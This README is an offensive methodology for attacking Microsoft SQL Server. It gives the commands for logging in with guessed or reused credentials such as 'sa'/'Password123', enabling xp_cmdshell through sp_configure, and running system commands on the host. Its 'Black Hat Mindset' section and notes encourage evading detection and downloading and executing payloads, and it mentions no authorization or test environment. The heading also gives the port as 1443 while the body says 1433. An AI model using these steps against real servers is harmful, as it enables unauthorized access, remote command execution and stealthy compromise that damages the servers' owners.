# Basic Methodology - Port 1443 (MSSQL)

This README provides a methodology for exploiting Microsoft SQL Server (MSSQL) running on port 1433. The focus is on leveraging password reuse to gain access using `mssql-cli` and executing system commands via `xp_cmdshell`.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Accessing MSSQL with Password Reuse](#accessing-mssql-with-password-reuse)
- [Executing Commands with xp_cmdshell](#executing-commands-with-xp_cmdshell)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

MSSQL, running on port 1433, is a widely used relational database management system by Microsoft. It is often targeted due to weak or reused credentials, which can allow unauthorized access. This guide covers using `mssql-cli` to connect to an MSSQL server by exploiting password reuse and executing system commands using the `xp_cmdshell` stored procedure.

## Setup and Prerequisites

To begin, ensure the following:

### Environment
- A Linux or Windows host with network access to the target MSSQL server.

### Tools
- Install `mssql-cli` (e.g., `pip install mssql-cli` or available in Kali Linux).
- Ensure network tools like `nmap` are available to verify port 1433 is open.

### Target Information
- Obtain the target server URL or IP address (e.g., `192.168.1.100`).
- Credential Lists: Prepare a list of usernames (e.g., `sa`, `admin`) and passwords, focusing on commonly reused credentials (e.g., `Password123`, `admin`).

## Accessing MSSQL with Password Reuse

Use `mssql-cli` to attempt accessing the MSSQL server by exploiting reused or weak credentials.

### Command
```bash
mssql-cli -S <server URL> -U <username> -P <password>
```

### Example
```bash
mssql-cli -S 192.168.1.100 -U sa -P Password123
```

### Behavior
- If the credentials are valid, `mssql-cli` connects to the MSSQL server, providing an interactive SQL prompt.
- If credentials are incorrect, the connection fails with an error.

### Notes
- The `sa` (system administrator) account is a common target due to its high privileges and frequent misconfiguration.
- Test credentials reused from other services (e.g., Windows domain accounts, web apps) or default passwords.
- Use tools like `hydra` or `metasploit` to automate credential guessing if manual attempts fail.

## Executing Commands with xp_cmdshell

Once access is gained, execute system commands on the MSSQL server using the `xp_cmdshell` stored procedure, if enabled.

### Command
```sql
EXEC xp_cmdshell 'dir *.exe';
```

### Example
At the `mssql-cli` prompt, run:
```sql
EXEC xp_cmdshell 'dir *.exe';
```

### Behavior
- Lists all .exe files in the current directory on the server's filesystem.
- Output is returned as a result set in the SQL client.

### Notes
- `xp_cmdshell` must be enabled on the server (often disabled by default in newer versions).
- To enable `xp_cmdshell` (if you have sufficient privileges):
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
- Use `xp_cmdshell` to run system commands like `whoami`, `net user`, or even download and execute payloads, but ensure stealth to avoid detection.

## Black Hat Mindset

To exploit MSSQL effectively, think like an attacker:

1. **Exploit Password Reuse**: Target credentials reused across services, especially the `sa` account with default or weak passwords.
2. **Verify Access**: Use `mssql-cli` or other tools to quickly test credentials and confirm access to the database.
3. **Maximize Impact**: Leverage `xp_cmdshell` to execute system-level commands, potentially escalating to full server control.
4. **Evade Detection**: Minimize command execution and avoid noisy operations that could trigger monitoring or logging.

## Resources

- [MSSQL Documentation](https://docs.microsoft.com/en-us/sql/)
- [mssql-cli GitHub Repository](https://github.com/dbcli/mssql-cli)
- [xp_cmdshell Security Considerations](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
- [SQL Server Security Best Practices](https://docs.microsoft.com/en-us/sql/relational-databases/security/security-best-practices)

